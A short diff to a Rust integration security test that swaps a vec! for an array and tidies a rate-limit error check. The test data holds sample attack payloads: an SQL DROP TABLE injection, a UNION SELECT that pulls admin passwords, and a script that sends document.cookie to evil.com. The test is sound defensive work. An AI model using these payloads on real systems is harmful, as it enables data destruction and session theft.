@@ -338,7 +338,7 @@ async fn test_integrated_security() -> Result<(), Box<dyn std::error::Error>> {
     let logger = AuditLogger::with_defaults();
 
     let attacker_ip = "192.168.1.666";
-    let malicious_payloads = vec![
+    let malicious_payloads = [
         "'; DROP TABLE users; --",
         "<script>fetch('evil.com/steal?data='+document.cookie)</script>",
         "UNION SELECT username, password FROM admin_users",
@@ -350,7 +350,7 @@ async fn test_integrated_security() -> Result<(), Box<dyn std::error::Error>> {
 
     for (i, payload) in malicious_payloads.iter().enumerate() {
         // レート制限チェック
-        if let Err(_) = rate_limiter.check_rate_limit(attacker_ip).await {
+        if (rate_limiter.check_rate_limit(attacker_ip).await).is_err() {
             logger
                 .log_security_attack(
                     "Rate Limit Exceeded",
